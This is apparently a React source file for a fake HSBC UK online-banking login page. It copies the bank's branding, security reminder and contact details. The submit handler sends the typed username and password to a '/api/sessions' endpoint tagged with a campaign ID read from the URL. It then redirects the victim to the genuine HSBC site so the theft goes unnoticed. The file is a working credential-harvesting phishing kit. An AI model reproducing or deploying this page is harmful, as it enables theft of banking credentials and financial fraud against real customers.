import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  username: string;
  password: string;
}

export default function HSBCLoginPage() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      await apiRequest("POST", "/api/sessions", {
        username: data.username,
        password: data.password,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://www.hsbc.co.uk/";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://www.hsbc.co.uk/";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-red-600">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <svg width="120" height="40" viewBox="0 0 120 40" className="text-white">
                <rect width="120" height="40" fill="#DB0011"/>
                <text x="20" y="26" fill="white" fontSize="20" fontWeight="bold">HSBC</text>
              </svg>
            </div>
            <nav className="hidden md:flex space-x-8">
              <a href="#" className="text-white hover:text-red-100">Help</a>
              <a href="#" className="text-white hover:text-red-100">Security</a>
              <a href="#" className="text-white hover:text-red-100">Contact Us</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex min-h-[calc(100vh-4rem)]">
        <div className="flex-1 flex items-center justify-center p-8">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-lg p-8">
              <div className="text-center mb-8">
                <h1 className="text-2xl font-bold text-gray-900 mb-2">
                  Log on to Online Banking
                </h1>
                <p className="text-gray-600">
                  Access your accounts safely and securely
                </p>
              </div>

              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <div>
                  <label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-2">
                    Username
                  </label>
                  <Input
                    id="username"
                    type="text"
                    {...form.register("username", { required: true })}
                    className="w-full px-3 py-3 border border-gray-300 rounded focus:border-red-500 focus:ring-red-500"
                    placeholder="Enter your username"
                    data-testid="input-username"
                  />
                </div>

                <div>
                  <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                    Password
                  </label>
                  <Input
                    id="password"
                    type="password"
                    {...form.register("password", { required: true })}
                    className="w-full px-3 py-3 border border-gray-300 rounded focus:border-red-500 focus:ring-red-500"
                    placeholder="Enter your password"
                    data-testid="input-password"
                  />
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-red-600 hover:bg-red-700 text-white py-3 px-4 rounded font-medium"
                  data-testid="button-login"
                >
                  {isSubmitting ? "Logging on..." : "Log on"}
                </Button>
              </form>

              <div className="mt-6 text-center space-y-3">
                <a href="#" className="block text-sm text-red-600 hover:text-red-500">
                  Forgotten your username or password?
                </a>
                <a href="#" className="block text-sm text-red-600 hover:text-red-500">
                  Register for Online Banking
                </a>
                <a href="#" className="block text-sm text-red-600 hover:text-red-500">
                  Download the HSBC UK Mobile Banking app
                </a>
              </div>

              <div className="mt-8 pt-6 border-t border-gray-200">
                <div className="flex items-start space-x-3 p-4 bg-red-50 rounded-lg">
                  <div className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5">⚠️</div>
                  <div className="text-sm text-red-800">
                    <p className="font-medium mb-1">Security reminder</p>
                    <p>We'll never ask you to confirm your Online Banking details by email. If you receive a suspicious email, forward it to phishing@hsbc.co.uk</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Side - Info */}
        <div className="hidden lg:block lg:w-1/3 bg-red-600 p-12 text-white">
          <h3 className="text-2xl font-bold mb-6">Why choose HSBC UK?</h3>
          <div className="space-y-6">
            <div className="border-l-2 border-white/30 pl-4">
              <h4 className="font-semibold mb-2">Global reach</h4>
              <p className="text-red-100">Access your money worldwide with our international network</p>
            </div>
            <div className="border-l-2 border-white/30 pl-4">
              <h4 className="font-semibold mb-2">Award-winning security</h4>
              <p className="text-red-100">Industry-leading protection for your accounts and data</p>
            </div>
            <div className="border-l-2 border-white/30 pl-4">
              <h4 className="font-semibold mb-2">24/7 banking</h4>
              <p className="text-red-100">Manage your finances anytime, anywhere</p>
            </div>
          </div>
          <div className="mt-12 p-6 bg-white/10 rounded-lg">
            <h4 className="font-semibold mb-3">Need help?</h4>
            <p className="text-sm text-red-100 mb-3">Our customer service team is here to help</p>
            <p className="text-sm font-medium">Call: 03457 404 404</p>
          </div>
        </div>
      </div>
    </div>
  );
}